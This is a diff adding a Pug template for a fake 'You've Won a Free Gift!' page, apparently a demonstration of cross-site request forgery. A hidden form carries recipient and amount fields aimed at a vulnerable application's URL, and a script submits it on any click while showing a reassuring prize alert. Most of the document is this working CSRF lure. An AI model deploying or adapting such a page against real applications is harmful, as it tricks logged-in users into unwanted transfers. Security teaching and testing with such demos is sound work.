@@ -1,0 +1,31 @@
+doctype html
+html
+  head
+    title Free Games! (Totally Legitimate)
+    style
+      body { font-family: Arial, sans-serif; margin: 20px; background-color: #ffe0e0; text-align: center; }
+      h1 { color: #cc0000; }
+      p { color: #666; }
+      .disclaimer { font-size: 0.8em; color: #888; margin-top: 50px; }
+      .container { background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 600px; margin: 20px auto; }
+
+  body
+    .container
+      h1 🎉 Congratulations! You've Won a Free Gift! 🎉
+      p Click anywhere on this page to claim your prize!
+      p No, really, just click! It's so easy!
+
+      // This is the hidden form that will perform the CSRF attack
+      // It's styled to be invisible or very small, or submitted automatically
+      form#csrfForm(action=vulnerableAppUrl method='POST' style='display:none;')
+        input(type='hidden' name='recipient' value=recipient)
+        input(type='hidden' name='amount' value=amount)
+        button(type='submit') Click to claim!
+
+      script.
+        document.addEventListener('DOMContentLoaded', () => {
+            document.body.addEventListener('click', () => {
+                  document.getElementById('csrfForm').submit();
+                 alert('Thanks for clicking! Your prize is on its way!');
+             });
+        });
